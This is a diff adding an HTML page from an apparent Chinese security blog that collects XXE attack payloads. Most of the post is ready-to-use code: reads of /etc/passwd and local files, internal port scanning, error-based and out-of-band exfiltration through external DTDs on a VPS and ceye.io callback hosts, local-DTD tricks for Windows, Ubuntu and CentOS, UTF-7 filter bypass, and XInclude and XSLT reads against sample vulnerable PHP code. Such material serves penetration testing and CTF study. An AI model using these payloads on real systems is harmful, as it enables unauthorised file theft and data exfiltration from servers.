@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            一些常见的XXE payload整理
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8"><span class="toc-text">常见利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-text">有回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-text">无回显</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8"><span class="toc-text">进阶利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8ELocal-dtd%E6%96%87%E4%BB%B6%E7%9A%84XXE"><span class="toc-text">基于Local-dtd文件的XXE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9payload%E8%BF%9B%E8%A1%8CUTF7%E7%BC%96%E7%A0%81"><span class="toc-text">对payload进行UTF7编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xinclude"><span class="toc-text">xinclude</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSLT"><span class="toc-text">XSLT</span></a></li></ol></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <p>最近遇到一些没有见过的xxe利用方式，就和之前的内容一起整理了一下。</p>
+<a id="more"></a>
+
+<h2 id="常见利用"><a href="#常见利用" class="headerlink" title="常见利用"></a>常见利用</h2><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><ul>
+<li>任意读取文件</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">	&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;&lt;&#x2F;root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在window中读取文件不需要使用file协议，用文件相对路径或者绝对路径即可。</p>
+<ul>
+<li>端口扫描</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;&lt;http:&#x2F;&#x2F;127.0.0.1:80&gt;&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;&lt;&#x2F;root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个用Brup去扫其实不太合适，建议使用python字写脚本。因为有些端口未开启，访问时没有回显，会一直处于请求状态。</p>
+<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><ul>
+<li>报错型的文件读取</li>
+</ul>
+<p>vps上的eval.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;&lt;http:&#x2F;&#x2F;aaaaaaa&#x2F;?%file;&gt;&#39;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发送payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY  % xxe SYSTEM &quot;&lt;http:&#x2F;&#x2F;45.32.75.237:1234&#x2F;error.dtd&gt;&quot; &gt;</span><br><span class="line">    %xxe;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>基于OOB的数据外带</li>
+</ul>
+<p>vps上的eval.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;&lt;http:&#x2F;&#x2F;ceye&#x2F;?%file;&gt;&#39;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发送payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY  % xxe SYSTEM &quot;&lt;http:&#x2F;&#x2F;45.32.75.237:1234&#x2F;eval.dtd&gt;&quot; &gt;</span><br><span class="line">    %xxe;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这两种方式的区别仅在于远程主机上的dtd文件中指定的网站host是否存在，如果不存在就报错，存在就外带。</p>
+<p>为什么一定要使用外部dtd文件，而不是直接在一个payload里面就包含外带的实体呢？原因是外部DTD允许我们在第二个实体中包含一个实体，但是在内部DTD中是被禁止的。(也就是禁止在内部Entity中引用参数实体)</p>
+<h2 id="进阶利用"><a href="#进阶利用" class="headerlink" title="进阶利用"></a>进阶利用</h2><h3 id="基于Local-dtd文件的XXE"><a href="#基于Local-dtd文件的XXE" class="headerlink" title="基于Local-dtd文件的XXE"></a>基于Local-dtd文件的XXE</h3><p>当服务器不允许请求外网，并且存在报错时可以使用这种方式。返回的结果跟报错型是一样的。</p>
+<ul>
+<li>windows，读取本地文件：</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;C:/Windows/System32/wbem/xml/cim20.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=C:/temp/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">SuperClass</span> <span class="meta-string">&#x27;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">		&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">		&amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">		&amp;#x25;send;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">	&lt;!ENTITY test &quot;test&quot;&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>111<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Linux Ubuntu</li>
+</ul>
+<p>用dtd-finder提取ubuntu里面的实体然后生成出的payload，在我的阿里云ubuntu的vps上也有这个dtd，应该是一个较为通用的dtd文件。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///usr/share/xml/schema/xml-core/catalog.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local</span>.uri.attribs <span class="meta-string">&#x27;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ELEMENT aa &quot;bb&quot;&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Linux Centos</li>
+</ul>
+<p>我只在我的腾讯云Centos的vps上发现了这个dtd文件。没有对应环境、暂且尝试这个吧，</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">expr</span> <span class="meta-string">&#x27;aaa)&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ELEMENT aa (bb&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>寻找本地可利用的dtd文件：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6913">https://xz.aliyun.com/t/6913</a> (手动寻找参考例子)</li>
+<li><a target="_blank" rel="noopener" href="https://blog.h3xstream.com/2019/07/automating-local-dtd-discovery-for-xxe.html">https://blog.h3xstream.com/2019/07/automating-local-dtd-discovery-for-xxe.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/GoSecure/dtd-finder">https://github.com/GoSecure/dtd-finder</a> (在上面的列表中不存的可以使用这个工具进行寻找)</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">工具使用：</span><br><span class="line">docker export <span class="tag">&lt;<span class="name">image</span>&gt;</span> -o iamge.tar</span><br><span class="line">java -jar dtd-finder-1.0-all.jar iamge.tar</span><br></pre></td></tr></table></figure>
+
+<h3 id="对payload进行UTF7编码"><a href="#对payload进行UTF7编码" class="headerlink" title="对payload进行UTF7编码"></a>对payload进行UTF7编码</h3><p>用使用这种方式可以绕过一些过滤</p>
+<p>utf-8 ⇒ utf-7 ：<a target="_blank" rel="noopener" href="https://www.motobit.com/util/charset-codepage-conversion.asp">https://www.motobit.com/util/charset-codepage-conversion.asp</a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-7&quot;?&gt;</span> </span><br><span class="line">+ADwAIQ-DOCTYPE foo +AFs-</span><br><span class="line">	+ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI- +AD4-</span><br><span class="line">+AF0APg-</span><br><span class="line">+ADw-root+AD4APA-name+AD4AJg-xxe+ADsAPA-/name+AD4APA-/root+AD4-</span><br></pre></td></tr></table></figure>
+
+<h3 id="xinclude"><a href="#xinclude" class="headerlink" title="xinclude"></a>xinclude</h3><p>在不允许包含外部实体，但又存在$dom-&gt;include();时，就可以利用xinclude读取文件。</p>
+<p>后台源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$xml</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">	<span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument;</span><br><span class="line">	<span class="variable">$dom</span>-&gt;preserveWhiteSpace = <span class="literal">false</span>;</span><br><span class="line">	<span class="variable">$dom</span>-&gt;formatOutput = <span class="literal">true</span>;</span><br><span class="line">	<span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xml</span>);</span><br><span class="line">	<span class="variable">$dom</span>-&gt;include(); <span class="comment">// 多了这一条语句</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$dom</span>-&gt;saveXML();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用的payload如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="XSLT"><a href="#XSLT" class="headerlink" title="XSLT"></a>XSLT</h3><p>XSLT：规定一个XML如何转换为其他文档。</p>
+<p>PHP默认没有这个扩展，需要手动安装。(phpstudy中直接开启php_xsl扩展即可)</p>
+<p>后台源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="variable">$xls</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>); <span class="comment">// 注意这里传递进来的是xsl</span></span><br><span class="line">	<span class="variable">$xslDoc</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">	<span class="variable">$xslDoc</span>-&gt;load(<span class="variable">$xls</span>);</span><br><span class="line">	<span class="variable">$xmlDoc</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">	<span class="variable">$xmlDoc</span>-&gt;load(<span class="string">&quot;test.xml&quot;</span>);</span><br><span class="line">	<span class="variable">$proc</span> = <span class="keyword">new</span> XSLTProcessor();</span><br><span class="line">	<span class="variable">$proc</span>-&gt;importStylesheet(<span class="variable">$xslDoc</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$proc</span>-&gt;transformToXML(<span class="variable">$xmlDoc</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>普通文件读取.xsl：(直接修改了root结点的内容)</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">shit</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=C:/temp/flag.txt&quot;</span>&gt;</span>   </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/root&quot;</span>&gt;</span></span><br><span class="line">  <span class="symbol">&amp;shit;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果未开启外部实体可以使用报错或者OOB方式读取文件，但是我在本机搭建的环境当中，无法外带出信息，只能通过报错读取出部分，就不深究了。</p>
+<p>报错：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=C:/temp/flag.txt&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>OOB：(也会通过报错查看到)</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;name1&quot;</span> <span class="attr">select</span>=<span class="string">&quot;document(&#x27;php://filter/read=convert.base64-encode/resource=C:/temp/flag.txt&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;name2&quot;</span> <span class="attr">select</span>=<span class="string">&quot;concat(&#x27;http://kih9lq.ceye.io/?&#x27;, $name1)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;name3&quot;</span> <span class="attr">select</span>=<span class="string">&quot;document($name2)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>参考这一篇：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/156227#h3-5">https://www.anquanke.com/post/id/156227</a></p>
+<p>CTF例子：<a target="_blank" rel="noopener" href="https://skysec.top/2018/03/23/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0xslt%E5%86%8D%E5%88%B0xxe%E7%9A%84%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9B%AE/#%E6%80%9D%E8%80%83%E6%94%BB%E5%87%BB%E7%82%B9">https://skysec.top/2018/03/23/从sql注入到xslt再到xxe的一道ctf题目/#思考攻击点</a></p>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
